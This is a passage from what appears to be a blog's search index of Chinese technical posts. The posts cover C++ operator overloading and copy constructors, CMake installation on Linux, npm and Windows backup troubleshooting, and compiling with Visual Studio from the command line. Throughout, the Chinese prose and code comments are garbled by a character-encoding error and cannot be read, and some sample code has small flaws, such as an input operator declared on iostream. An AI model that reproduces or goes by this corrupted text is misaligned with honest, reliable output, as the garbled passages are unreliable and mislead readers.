p) const { return strcmp(p, this-&gt;m_space) &lt; 0;}bool MyString::operator&gt;(const MyString str) const { return strcmp(str.m_space, this-&gt;m_space) &lt; 0;}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°é‡è½½ "&lt;" è¿ç®—ç¬¦bool MyString::operator&lt;(const char* p) const { return strcmp(this-&gt;m_space, p) &lt; 0;}bool MyString::operator&lt;(const MyString str) const { return strcmp(this-&gt;m_space, str.m_space) &lt; 0;}// ä½¿ç”¨å‹å…ƒå‡½æ•°é‡è½½ "&lt;&lt;" è¿ç®—ç¬¦ostream&amp; operator&lt;&lt;(ostream&amp; out, MyString&amp; str) { out &lt;&lt; str.m_space; return out;}// ä½¿ç”¨å‹å…ƒå‡½æ•°é‡è½½ "&gt;&gt;" è¿ç®—ç¬¦iostream&amp; operator&gt;&gt;(iostream&amp; in, MyString&amp; str){ in &gt;&gt; str.m_space; return in;}int MyString::length(){ return this-&gt;m_length;}char* MyString::c_str() { return this-&gt;m_space;} main.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include "MyString.h"int main() { // è‡ªåŠ¨è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•° MyString str1("Tom"); MyString str2(NULL); MyString str3("Peter"); // è‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•° MyString str4 = str1; // é‡è½½ "&lt;&lt;" è¿ç®—ç¬¦ cout &lt;&lt; "str2 = " &lt;&lt; str2 &lt;&lt; endl; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; cout &lt;&lt; endl; // ä¸ä¼šè‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼ˆå±äºæµ…æ‹·è´ï¼‰ // é‡è½½ "=" è¿ç®—ç¬¦ï¼Œå®ç°æ·±æ‹·è´ str4 = str3; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; str4 = "Jim"; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; str4 = NULL; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; cout &lt;&lt; endl; // é‡è½½ "[]" è¿ç®—ç¬¦ MyString str5("David"); str5[0] = \'F\'; cout &lt;&lt; "str5[0] = " &lt;&lt; str5[0] &lt;&lt; endl; cout &lt;&lt; "str5 = " &lt;&lt; str5 &lt;&lt; endl; cout &lt;&lt; endl; // é‡è½½ "==" è¿ç®—ç¬¦ MyString str6("Aaron"); MyString str7 = str6; cout &lt;&lt; str6 &lt;&lt; (str6 == str7 ? " = " : " != ") &lt;&lt; str7 &lt;&lt; endl; // é‡è½½ "!=" è¿ç®—ç¬¦ cout &lt;&lt; str6 &lt;&lt; (str6 != NULL ? " != " : " = ") &lt;&lt; " NULL" &lt;&lt; endl; cout &lt;&lt; endl; // é‡è½½ "&lt;" è¿ç®—ç¬¦ MyString str8("AAAA"); MyString str9("BBBB"); cout &lt;&lt; str8 &lt;&lt; (str8 &lt; str9 ? " &lt; " : " &gt; ") &lt;&lt; str9 &lt;&lt; endl; cout &lt;&lt; str8 &lt;&lt; (str8 &lt; "CCCC" ? " &lt; " : " &gt; ") &lt;&lt; "CCCC" &lt;&lt; endl; // é‡è½½ "&gt;" è¿ç®—ç¬¦ cout &lt;&lt; str9 &lt;&lt; (str9 &gt; str8 ? " &gt; " : " &lt; ") &lt;&lt; str8 &lt;&lt; endl; cout &lt;&lt; str9 &lt;&lt; (str9 &gt; "DDDD" ? " &gt; " : " &lt; ") &lt;&lt; "DDDD" &lt;&lt; endl; cout &lt;&lt; endl; // é‡è½½ "&gt;&gt;" è¿ç®—ç¬¦ MyString str11(5); cout &lt;&lt; "è¯·è¾“å…¥é•¿åº¦ä¸º 5 çš„å­—ç¬¦ä¸²ï¼š" &lt;&lt; endl; cin &gt;&gt; str11.c_str(); cout &lt;&lt; "str11 = " &lt;&lt; str11 &lt;&lt; endl; // MyString str4 = NULL; æ­¤å†™æ³•ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•° `MyString(const char* p);` // MyString str1("AB"); // MyString str2 = str1; // str2 = NULL: æ­¤å†™æ³•ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ "=" è¿ç®—ç¬¦é‡è½½çš„å‡½æ•° `bool operator==(const char* p) const;` return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123456789101112131415161718192021str2 =str4 = Tomstr4 = Peterstr4 = Jimstr4 =str5[0] = Fstr5 = FavidAaron = AaronAaron != NULLAAAA &lt; BBBBAAAA &lt; CCCCBBBB &gt; AAAABBBB &lt; DDDDè¯·è¾“å…¥é•¿åº¦ä¸º 5 çš„å­—ç¬¦ä¸²ï¼šabcdestr11 = abcde C++ è¿ç®—ç¬¦å’Œç»“åˆæ€§çš„é™„å½• var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"CMake å…¥é—¨æ•™ç¨‹ä¹‹ä¸€ Linux å®‰è£… CMake",url:"/posts/65d4f633.html",text:'Linux å®‰è£… CMake3é€šè¿‡è½¯ä»¶ä»“åº“å®‰è£… OpenSSLæç¤º åœ¨ Linux ç³»ç»Ÿä¸Šï¼Œå®‰è£… CMake3 çš„æ—¶å€™ï¼Œä¸€èˆ¬éœ€è¦æå‰å®‰è£… OpenSSLï¼Œå°¤å…¶æ˜¯ä½¿ç”¨æºç ç¼–è¯‘çš„æ–¹å¼å®‰è£… CMake3 åœ¨ Linux ç³»ç»Ÿä¸Šï¼ŒOpenSSL é€šè¿‡æºç ç¼–è¯‘å®‰è£…çš„æ•™ç¨‹å¯ä»¥çœ‹è¿™é‡Œ CentOS/Fedora 1# yum install -y openssl openssl-devel Debian/Ubuntu 1# apt-get -y install zlib1g zlib1g-dev libssl-dev é€šè¿‡è½¯ä»¶ä»“åº“å®‰è£… CMake3 CentOS/Fedora 12345# æ·»åŠ EPELæº# yum install epel-release# å®‰è£…Cmake3# yum install -y cmake3 æœ¬åœ°æ‰‹åŠ¨ç¼–è¯‘å®‰è£… CMake3æç¤º å„ç‰ˆæœ¬çš„ CMake3 å¯ä»¥ä» GitHub ä»“åº“ä¸‹è½½å¾—åˆ° CMake3 ä½¿ç”¨æºç ç¼–è¯‘å®‰è£…çš„æ–¹å¼ï¼Œé€‚ç”¨äºç»å¤§å¤šæ•° Linux å‘è¡Œç‰ˆï¼Œä¾‹å¦‚ï¼šDebian/Ubuntuã€‚ 1234567891011121314151617181920212223242526# ä¸‹è½½æ–‡ä»¶# wget https://github.com/Kitware/CMake/releases/download/v3.21.0-rc1/cmake-3.21.0-rc1.tar.gz# è§£å‹æ–‡ä»¶# tar -zxvf cmake-3.21.0-rc1.tar.gz# è¿›å…¥è§£å‹ç›®å½•# cd cmake-3.21.0-rc1# æ„å»º# ./bootstrap# ç¼–è¯‘# make -j4# å®‰è£…# make install# åˆ›å»ºè½¯é“¾æ¥# ln -sf /usr/local/bin/cmake /usr/local/bin/cmake3# æŸ¥çœ‹ç‰ˆæœ¬å·# cmake3 --version# æˆ–è€…# cmake --version CMake å‘½ä»¤è¡Œç¼–è¯‘ä»£ç 1234567891011121314151617# è¿›å…¥é¡¹ç›®æ ¹ç›®å½•# cd my_project# åˆ›å»ºæ„å»ºç›®å½•# mkdir build# è¿›å…¥æ„å»ºç›®å½•# cd build# ç”Ÿæˆmakefile# cmake3 ..# ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶# make# è¿è¡Œå¯æ‰§è¡Œç¨‹åº# ./my_project var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ linuxç³»ç»Ÿç¼–ç¨‹ cè¯­è¨€"},{title:"è§£å†³ Windows ç³»ç»Ÿä½¿ç”¨ NPM æ—¶é‡åˆ°çš„å„ç§é—®é¢˜",url:"/posts/b53b9a77.html",text:'pngquant-bin æ¨¡å—å®‰è£…å¤±è´¥ é”™è¯¯ä¿¡æ¯ï¼š 1234567891011npm ERR! path E:\\Workspaces_NodeJs\\hexo\\node_modules\\pngquant-binnpm ERR! command failednpm ERR! command C:\\WINDOWS\\system32\\cmd.exe /d /s /c node lib/install.jsnpm ERR! â€¼ getaddrinfo ENOENT raw.githubusercontent.comnpm ERR! â€¼ pngquant pre-build test failednpm ERR! i compiling from sourcenpm ERR! Ã— ErroE: pngquant failed to build, make sure that libpng-dev is installednpm ERR! at E:\\Workspaces_NodeJs\\hexo\\node_modules\\bin-build\\node_modules\\execa\\index.js:231:11npm ERR! at runMicrotasks (&lt;anonymous&gt;)npm ERR! at processTicksAndRejections (node:internal/process/task_queues:96:5)npm ERR! at async Promise.all (index 0) è§£å†³æ–¹æ³•ä¸€ï¼šä½¿ç”¨ ç³»ç»Ÿç®¡ç†å‘˜èº«ä»½ï¼Œåœ¨ Windows ç³»ç»Ÿä¸Šæ‰§è¡Œ npm install -g windows-build-tools å‘½ä»¤ï¼Œå®‰è£…ç³»ç»Ÿç¼ºå¤±çš„ç¼–è¯‘å·¥å…·ï¼Œç„¶åæ‰§è¡Œ npm install å‘½ä»¤å®‰è£…éœ€è¦çš„ NPM æ¨¡å— è§£å†³æ–¹æ³•äºŒï¼ˆæ¨èï¼‰ï¼šä½¿ç”¨ CNPM æ›¿ä»£ NPMï¼Œç„¶åæ‰§è¡Œ cnpm install å‘½ä»¤å®‰è£…éœ€è¦çš„ NPM æ¨¡å— 12# å®‰è£…CNPMnpm install -g cnpm --registry=https://registry.npmmirror.com è§£å†³æ–¹æ³•ä¸‰ï¼ˆæ¨èï¼‰ï¼šåœ¨ Windows ç³»ç»Ÿä¸ŠæŒ‚è½½ VPNï¼Œç„¶åæ‰§è¡Œ npm install å‘½ä»¤å®‰è£…éœ€è¦çš„ NPM æ¨¡å—ï¼Œè¿™å¯ä»¥ä»æ ¹æœ¬ä¸Šè§£å†³å›½å†…è®¿é—® raw.githubusercontent.com åŸŸåæ—¶è¢«å¢™çš„é—®é¢˜ è§£å†³æ–¹æ³•å››ï¼šæ›´æ”¹ Host æ–‡ä»¶ C:\\Windows\\System32\\drivers\\etc\\hostsï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼Œè§£å†³å›½å†…è®¿é—® raw.githubusercontent.com åŸŸåæ—¶è¢«å¢™çš„é—®é¢˜ï¼Œç„¶åæ‰§è¡Œ npm install å‘½ä»¤å®‰è£…éœ€è¦çš„ NPM æ¨¡å— 1199.232.28.133 raw.githubusercontent.com var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"windowsç³»ç»Ÿ"},{title:"Windows 10 ç³»ç»Ÿå¤‡ä»½ä¸è¿˜åŸå¸¸è§é”™è¯¯è§£å†³",url:"/posts/490dddd2.html",text:'å‰è¨€Windows 10 ä¸­çš„å¤‡ä»½å’Œè¿˜åŸï¼ˆWindows 7ï¼‰ä½œä¸º Microsoft Windows ç»„ä»¶ï¼Œç»§æ‰¿äº† Windows 7 çš„åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½ä½¿æ‚¨å¯ä»¥å¤‡ä»½ä¸æ¢å¤æ–‡ä»¶ä»¥åŠåˆ›å»ºç³»ç»Ÿæ˜ åƒã€‚å¦‚æœåœ¨ Windows çš„æ—©æœŸç‰ˆæœ¬ä¸­ä½¿ç”¨ å¤‡ä»½ å’Œ è¿˜åŸ æ¥å¤‡ä»½æ–‡ä»¶æˆ–åˆ›å»ºç³»ç»Ÿæ˜ åƒï¼Œåˆ™ä»å¯ä»¥åœ¨ Windows 10 ä¸­æ¢å¤è¿™äº›å¤‡ä»½ã€‚æ­¤å¤–ï¼ŒWindows 10 è¿˜åŒ…æ‹¬å¦ä¸€ä¸ªå¤‡ä»½ä¸æ¢å¤å·¥å…· - æ–‡ä»¶å†å²è®°å½•ï¼Œå®ƒåªå¤‡ä»½æ–‡æ¡£ï¼ŒéŸ³ä¹ï¼Œå›¾ç‰‡ï¼Œè§†é¢‘å’Œæ¡Œé¢æ–‡ä»¶å¤¹ä¸­æ–‡ä»¶çš„ç‰ˆæœ¬ï¼Œä»¥åŠ PC ä¸Šå¯ç”¨çš„ OneDrive æ–‡ä»¶ã€‚å¦‚æœè¦ä½¿ç”¨ æ–‡ä»¶å†å²è®°å½• å¤‡ä»½ä½äºå…¶ä»–ä½ç½®çš„å…¶ä»–æ–‡ä»¶ï¼Œå¯ä»¥å°†å…¶ç§»è‡³è¿™äº›æ–‡ä»¶å¤¹ä¹‹ä¸€ï¼Œç„¶åå†è¿›è¡Œå¤‡ä»½ã€‚ä¿å­˜å¤‡ä»½çš„ä¸¤ä¸ªç›®æ ‡åœ°å€æ”¯æŒå¤–éƒ¨ç¡¬ç›˜é©±åŠ¨å™¨ï¼ˆä¾‹å¦‚ USB é—ªå­˜é©±åŠ¨å™¨ï¼‰å’Œç½‘ç»œä½ç½®ã€‚ ç³»ç»Ÿå¤‡ä»½å¸¸è§é”™è¯¯é”™è¯¯ä¸€é”™è¯¯æç¤ºä¿¡æ¯æ— æ³•åˆ›å»ºå·å½±å‰¯æœ¬ï¼Œè¯·æ£€æŸ¥ vss å’Œ spp åº”ç”¨ç¨‹åºäº‹ä»¶æ—¥å¿—æ›´å¤šä¿¡æ¯ï¼ˆé”™è¯¯ä»£ç ï¼š0x81000019ï¼‰ æˆ–è€… ç”±äºå†…éƒ¨é”™è¯¯ï¼Œå¤‡ä»½åº”ç”¨ç¨‹åºæ— æ³•å¯åŠ¨ï¼šå·å½±å¤åˆ¶æœåŠ¡ç»„ä»¶é‡åˆ°æ„å¤–é”™è¯¯ï¼ˆé”™è¯¯ä»£ç ï¼š0x80042302ï¼‰ é”™è¯¯è§£å†³æ–¹æ¡ˆä¸€è¿™ä¸ªé”™è¯¯å¯èƒ½æ˜¯ç”±äºä¸‰æ–¹æ€æ¯’è½¯ä»¶å†²çªæˆ–è€…ä¸€äº› Windows å¤‡ä»½ç›¸å…³çš„æœåŠ¡è¢«ç¦ç”¨å¯¼è‡´çš„ï¼Œå…·ä½“è§£å†³æ­¥éª¤å¦‚ä¸‹ï¼š a) æš‚æ—¶å…³é—­æˆ–å¸è½½ç¬¬ä¸‰æ–¹æ€æ¯’è½¯ä»¶ b) ä½¿ç”¨å¿«æ·é”® windows + rï¼Œè¾“å…¥ services.mscï¼Œæ‰“å¼€æœåŠ¡æ§åˆ¶å°ï¼Œå¹¶æ£€æŸ¥ä¸‹åˆ—æœåŠ¡æ˜¯å¦æ­£å¸¸è¿è¡Œã€‚å¦‚æœæœåŠ¡è¢«ç¦ç”¨ï¼Œè¯·å°†å…¶å¯ç”¨ï¼Œå¹¶å°†å¯åŠ¨ç±»å‹è®¾ç½®ä¸º è‡ªåŠ¨ã€‚ 12345Volume Shadow Copy (VSS)Remote Procedure Call (RPCSS)COM+ Event System (eventsystem)System Event Notification Service (sens)Microsoft Software Shadow Copy Provider (SWPRV) c) é‡å¯ Windows 10 ç³»ç»Ÿï¼Œç„¶åå†æ¬¡å°è¯•æ‰§è¡Œç³»ç»Ÿå¤‡ä»½ (adsbygoogle = window.adsbygoogle || []).push({}); é”™è¯¯è§£å†³æ–¹æ¡ˆäºŒ a) ä½¿ç”¨å¿«æ·é”® windows + rï¼Œè¾“å…¥ msconfig b) ç‚¹å‡» æœåŠ¡ æ ‡ç­¾å¡ï¼Œå‹¾é€‰ éšè—æ‰€æœ‰çš„ Microsoft æœåŠ¡ ï¼Œç„¶åç‚¹å‡»å…¨éƒ¨ç¦ç”¨å¹¶åº”ç”¨ c) ç‚¹å‡» å¯åŠ¨ æ ‡ç­¾å¡ï¼Œç‚¹å‡» æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ d) ç¦ç”¨å…¨éƒ¨å¼€æœºå¯åŠ¨é¡¹ e) é‡å¯ Windows 10 ç³»ç»Ÿï¼Œç„¶åå†æ¬¡å°è¯•æ‰§è¡Œç³»ç»Ÿå¤‡ä»½ f) ç³»ç»ŸæˆåŠŸå¤‡ä»½åï¼Œé‡æ–°å¯ç”¨åœ¨ä¸Šé¢çš„æ­¥éª¤ä¸­ç¦ç”¨çš„æœåŠ¡å’Œå¼€æœºå¯åŠ¨é¡¹ï¼Œæœ€åå†æ¬¡é‡å¯ç³»ç»Ÿ é”™è¯¯äºŒé”™è¯¯æç¤ºä¿¡æ¯Windows å¤‡ä»½åœ¨æºå·ä¸Šåˆ›å»ºå…±äº«ä¿æŠ¤ç‚¹å¤±è´¥ï¼ˆé”™è¯¯ä»£ç ï¼š0Ã—8078006Bï¼‰ é”™è¯¯è§£å†³æ–¹æ¡ˆè¿™ä¸ªé”™è¯¯ä¸€èˆ¬æ˜¯ç”±ç¨‹åºå†²çªå¼•èµ·çš„ï¼Œç›®å‰æ’æŸ¥å‡ºæ˜¯ è…¾è®¯ç”µè„‘ç®¡å®¶ çš„è®¾ç½®é—®é¢˜å¯¼è‡´ï¼Œå…·ä½“è§£å†³æ­¥éª¤å¦‚ä¸‹ï¼š a) æ‰“å¼€ è…¾è®¯ç”µè„‘ç®¡å®¶ çš„ è®¾ç½®ä¸­å¿ƒ b) æ‰¾åˆ° å®æ—¶é˜²æŠ¤ èœå•ä¸‹é¢çš„ å…¶ä»–å®‰å…¨æç¤ºï¼Œå°† å¼€å¯å·å½±å¤‡ä»½ çš„å‹¾é€‰å»æ‰ c) å¦‚æœä¸Šè¿°è®¾ç½®ä»ç„¶æ²¡åŠæ³•è§£å†³é—®é¢˜ï¼Œå»ºè®®æš‚æ—¶å…³é—­æˆ–å¸è½½ è…¾è®¯ç”µè„‘ç®¡å®¶ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"windowsç³»ç»Ÿ"},{title:"Visual Studio ä½¿ç”¨å‘½ä»¤è¡Œç¼–è¯‘ C/C++ ç¨‹åº",url:"/posts/ab3ae9a.html",text:'VS ä½¿ç”¨å‘½ä»¤è¡Œç¼–è¯‘å•ä¸ª C/C++ æºæ–‡ä»¶åœ¨ Windows ç³»ç»Ÿçš„å¼€å§‹èœå•æ é‡Œï¼Œæ‰¾åˆ° Developer Command Prompt for VS xxxx åº”ç”¨ç¨‹åºï¼ŒåŒå‡»è¿è¡Œåï¼Œåœ¨ Command çª—å£å†…æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥ç¼–å•ä¸ª C/C++ æºæ–‡ä»¶ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œéœ€è¦å°†ä»¥ä¸‹å‘½ä»¤ä¸­çš„ HelloWorld å­—ç¬¦ä¸²æ›¿æ¢ä¸ºæœ¬åœ°çœŸæ­£çš„ C/C++ æºæ–‡ä»¶çš„æ–‡ä»¶åã€‚ 12345678910111213141516171819# æŸ¥çœ‹æ–‡ä»¶åˆ—è¡¨&gt; dir2021/10/30 16:05 &lt;DIR&gt; .2021/10/30 16:05 &lt;DIR&gt; ..2021/10/30 22:15 601 HelloWorld.cpp# ç¼–è¯‘C/C++æºæ–‡ä»¶ï¼ˆclåé¢å­—ç¬¦çš„æ˜¯å°å†™Lä¸æ˜¯æ•°å­—1ï¼‰&gt; cl HelloWorld.cpp /EHsc# æŸ¥çœ‹æ–‡ä»¶åˆ—è¡¨ï¼Œå‘ç°æˆåŠŸç¼–è¯‘åä¼šå¤šäº†ä¸¤ä¸ªæ–‡ä»¶&gt; dir2021/10/30 16:53 &lt;DIR&gt; .2021/10/30 16:53 &lt;DIR&gt; ..2021/10/30 22:15 601 HelloWorld.cpp2021/10/30 16:53 101,888 HelloWorld.exe2021/10/30 16:53 1,976 HelloWorld.obj# è¿è¡Œç¼–è¯‘åçš„C/C++ç¨‹åº&gt; HelloWorld æˆ–è€… HelloWorld.exe VS ä½¿ç”¨å‘½ä»¤è¡Œç¼–è¯‘å¤šä¸ª C/C++ æºæ–‡ä»¶å‡è®¾é¡¹ç›®é‡Œæœ‰å¦‚ä¸‹çš„ä¸‰ä¸ª C/C++ æºæ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯ Array.hã€Array.cppã€main.cppï¼Œé‚£ä¹ˆç¼–è¯‘è¿™å‡ ä¸ªæ–‡ä»¶æ—¶å°±å¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼šcl main.cpp Array.cpp /EHscã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œç¼–è¯‘å‘½ä»¤é‡Œä¸éœ€è¦æŒ‡å®šä»¥ .h ä½œä¸ºåç¼€çš„æ–‡ä»¶ï¼Œåªéœ€è¦æŒ‡å®šæ‰€æœ‰ä»¥ .c æˆ–è€… .cpp ä½œä¸ºåç¼€çš„æ–‡ä»¶å³å¯ã€‚ Array.h 1234567891011121314151617181920212223#pragma once#include &lt;iostream&gt;using namespace std;class Array {public: Array(int length); Array(const Array&amp; array); ~Array();public: void setData(int index, int value); int getData(int index); int length();private: int m_length; int* m_space;}; Array.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041#include "Array.h"Array::Array(int length) { cout &lt;&lt; "æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; if (length &lt; 0) { length = 0; } this-&gt;m_length = length; this-&gt;m_space = new int[length];}Array::Array(const Array&amp; array) { cout &lt;&lt; "æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; // æ·±æ‹·è´ï¼Œå•ç‹¬åˆ†é…å†…å­˜ç©ºé—´ this-&gt;m_length = array.m_length; this-&gt;m_space = new int[array.m_length]; for (int i = 0; i &lt; array.m_length; i++) { this-&gt;m_space[i] = array.m_space[i]; }}Array::~Array() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; }}void Array::setData(int index, int value) { this-&gt;m_space[index] = value;}int Array::getData(int index) { return this-&gt;m_space[index];}int Array::length() { return this-&gt;m_length;} main.cpp 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include "Array.h"using namespace std;int main() { // è‡ªåŠ¨è°ƒç”¨æ„é€ å‡½æ•°åˆå§‹åŒ–æ•°ç»„ Array array1(5); // æ•°ç»„èµ‹å€¼ for (int i = 0; i &lt; array1.length(); i++) { array1.setData(i, i); } // æ‰“å°æ•°ç»„ for (int i = 0; i &lt; array1.length(); i++) { cout &lt;&lt; "array1[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array1.getData(i) &lt;&lt; endl; } // è‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°åˆå§‹åŒ–æ•°ç»„ï¼ˆå±äºæ·±æ‹·è´ï¼‰ Array array2 = array1; // æ‰“å°æ•°ç»„ for (int i = 0; i &lt; array2.length(); i++) { cout &lt;&lt; "array2[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array2.getData(i) &lt;&lt; endl; } return 0;} æ‰§è¡Œå‘½ä»¤ç¼–è¯‘ C/C++ ç¨‹åºåï¼Œæ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 1234567891011121314&gt; cl main.cpp Array.cpp /EHscç”¨äº x86 çš„ Microsoft (R) C/C++ ä¼˜åŒ–ç¼–è¯‘å™¨ 19.29.30136 ç‰ˆç‰ˆæƒæ‰€æœ‰(C) Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚main.cppArray.cppæ­£åœ¨ç”Ÿæˆä»£ç ...Microsoft (R) Incremental Linker Version 14.29.30136.0Copyright (C) Microsoft Corporation. All rights reserved./out:main.exemain.objArray.obj è¿è¡Œç¼–è¯‘åçš„ C/C++ ç¨‹åºï¼š 12345678910111213141516&gt; mainæœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨array1[0] = 0array1[1] = 1array1[2] = 2array1[3] = 3array1[4] = 4æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨array2[0] = 0array2[1] = 1array2[2] = 2array2[3] = 3array2[4] = 4ææ„å‡½æ•°è¢«è°ƒç”¨ææ„å‡½æ•°è¢«è°ƒç”¨ å‚è€ƒåšå®¢ æ¨¡ä»¿ Visual Studio - å‘½ä»¤è¡Œç¼–è¯‘ C/C++ ç¨‹åº var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ å¼€å‘å·¥å…·"},{title:"C++ å…¥é—¨åŸºç¡€ä¹‹äº”",url:"/posts/a35089f6.html",text:'æµ…æ‹·è´ä¸æ·±æ‹·è´ C++ æä¾›çš„é»˜è®¤æ‹·è´æ„é€ å‡½æ•°ï¼Œå¯ä»¥å®Œæˆå¯¹è±¡çš„æ•°æ®æˆå‘˜å€¼ç®€å•çš„å¤åˆ¶ï¼ˆæµ…æ‹·è´ï¼‰ å¯¹è±¡çš„æ•°æ®èµ„æºæ˜¯ç”±æŒ‡é’ˆæŒ‡å‘çš„å †ï¼ŒC++ æä¾›çš„é»˜è®¤æ‹·è´æ„é€ å‡½æ•°ä»…ä½œæŒ‡é’ˆå€¼å¤åˆ¶ï¼ˆæµ…æ‹·è´ï¼‰ æµ…æ‹·è´é—®é¢˜å‰–æ é—®é¢˜æŠ›å‡ºæ€è€ƒä»¥ä¸‹çš„ä»£ç ä¸ºä»€ä¹ˆä¼šå¼‚å¸¸ç»ˆæ­¢è¿è¡Œã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include "string.h"using namespace std;class Name {private: char *p; int len;public: Name(const char *name) { cout &lt;&lt; "æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; int length = strlen(name); p = (char *) malloc(length + 1); strcpy(p, name); len = length; } ~Name() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; if (p != NULL) { free(p); p = NULL; len = 0; } } char *getP() const { return p; } int getLen() const { return len; }};int main() { Name obj1("Peter"); Name obj2 = obj1; // è‡ªåŠ¨è°ƒç”¨C++æä¾›çš„é»˜è®¤æ‹·è´æ„é€ å‡½æ•°ï¼Œå±äºæµ…æ‹·è´ cout &lt;&lt; "obj1.name: " &lt;&lt; obj1.getP() &lt;&lt; ", obj1.len: " &lt;&lt; obj1.getLen() &lt;&lt; endl; cout &lt;&lt; "obj2.name: " &lt;&lt; obj2.getP() &lt;&lt; ", obj2.len: " &lt;&lt; obj2.getLen() &lt;&lt; endl; return 0;} 